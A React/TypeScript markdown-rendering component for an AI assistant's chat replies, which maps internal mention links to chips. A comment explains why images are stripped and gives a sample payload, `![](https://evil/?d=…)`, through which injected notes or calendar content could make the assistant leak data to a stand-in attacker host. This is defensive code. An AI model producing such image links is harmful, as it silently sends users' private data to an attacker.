import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { MentionChip } from "./MentionText.tsx";

/** A reference to something in Hermes rather than somewhere on the web. */
const INTERNAL = /^(block|person|tag):/;

/**
 * Titles come back from the tools exactly as they're stored, which means a title
 * with an @mention or a |link in it arrives as markdown pointing at "block:<id>"
 * — a scheme no browser can follow. Strip the sigil that precedes such a link
 * (the chip draws its own glyph) and let the renderer turn it into a chip.
 */
/** The plain text inside a rendered node — a link's label, which arrives as a
 * string or as an array of them depending on how it was written. */
function textOf(node: unknown): string {
  if (typeof node === "string") return node;
  if (Array.isArray(node)) return node.map(textOf).join("");
  return "";
}

function prepare(md: string): string {
  return md.replace(/([@|#])(\[[^\]]*\]\((?:block|person|tag):)/g, "$2");
}

/**
 * Renders assistant markdown: GFM tables, task lists, autolinks, strikethrough,
 * code, blockquotes, etc. react-markdown maps to React elements (no raw-HTML
 * injection, so no XSS). Links open in a new tab; wide tables scroll on their
 * own instead of stretching the chat column.
 *
 * Images are dropped deliberately. An assistant reply is attacker-influenced —
 * its context includes note text and untrusted calendar-feed content — and a
 * markdown image loads with no user interaction, so `![](https://evil/?d=…)`
 * would be a zero-click channel for smuggling out whatever the model just read.
 * Assistant replies have no legitimate need to embed remote images.
 */
export function Markdown({ children }: { children: string }) {
  return (
    <div className="md">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        disallowedElements={["img"]}
        unwrapDisallowed
        components={{
          a: ({ href, children }) =>
            href && INTERNAL.test(href) ? (
              // Opens in the panel (or as a page on a phone), same as a chip
              // anywhere else — not a new tab pointed at an unknown scheme.
              <MentionChip href={href} label={textOf(children)} />
            ) : (
              <a href={href} target="_blank" rel="noreferrer noopener">
                {children}
              </a>
            ),
          table: ({ children }) => (
            <div className="md-table-wrap">
              <table>{children}</table>
            </div>
          ),
        }}
      >
        {prepare(children)}
      </ReactMarkdown>
    </div>
  );
}
